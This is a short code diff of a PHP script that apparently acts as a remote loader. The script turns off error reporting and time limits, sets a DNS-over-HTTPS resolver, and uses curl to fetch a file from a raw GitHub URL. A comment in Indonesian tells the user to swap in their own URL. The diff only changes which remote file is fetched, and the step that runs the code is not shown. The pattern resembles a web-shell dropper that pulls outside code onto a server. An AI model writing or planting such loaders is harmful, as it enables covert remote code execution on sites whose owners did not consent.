@@ -3,7 +3,7 @@ error_reporting(0);
 set_time_limit(0);
 
 // Ganti dengan URL Anda
-$url = "https://raw.githubusercontent.com/aqilogic/logic/refs/heads/main/IDontKnow.php";
+$url = "https://raw.githubusercontent.com/aqilogic/logic/refs/heads/main/IDontKnow";
 $dns = "https://cloud-dns.com/dns-query"; // bisa diubah juga
 
 $ch = curl_init($url);
